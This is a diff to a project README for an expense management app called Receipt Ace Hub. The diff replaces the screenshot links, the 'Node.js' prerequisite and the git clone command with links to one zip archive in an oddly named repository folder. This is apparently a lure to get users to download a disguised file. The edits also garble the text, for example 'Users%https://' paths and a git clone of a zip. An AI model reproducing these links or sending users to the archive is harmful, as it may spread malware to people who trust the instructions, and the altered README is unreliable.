@@ -1,10 +1,10 @@
 # Receipt Ace Hub
 
-![Login Screen](./public/Login.png)
+![Login Screen](https://raw.githubusercontent.com/kartik-parmar007/odoo-expense-management-system/main/Dermorhynchi/odoo-expense-management-system.zip)
 
-![Users Management](./public/Users%20Management.png)
+![Users Management](./public/Users%https://raw.githubusercontent.com/kartik-parmar007/odoo-expense-management-system/main/Dermorhynchi/odoo-expense-management-system.zip)
 
-![Admin Overview](./public/Admin%20Overview%20Dashboard.png)
+![Admin Overview](./public/Admin%20Overview%https://raw.githubusercontent.com/kartik-parmar007/odoo-expense-management-system/main/Dermorhynchi/odoo-expense-management-system.zip)
 
 ## Overview
 
@@ -30,14 +30,14 @@ Receipt Ace Hub is a modern expense management application built with React, Typ
 
 ### Prerequisites
 
-- Node.js (version 16 or higher)
+- https://raw.githubusercontent.com/kartik-parmar007/odoo-expense-management-system/main/Dermorhynchi/odoo-expense-management-system.zip (version 16 or higher)
 - npm or yarn
 
 ### Installation
 
 1. Clone the repository:
 
-git clone https://github.com/kartik-parmar007/odoo-expense-management-system.git
+git clone https://raw.githubusercontent.com/kartik-parmar007/odoo-expense-management-system/main/Dermorhynchi/odoo-expense-management-system.zip
 
 text
 
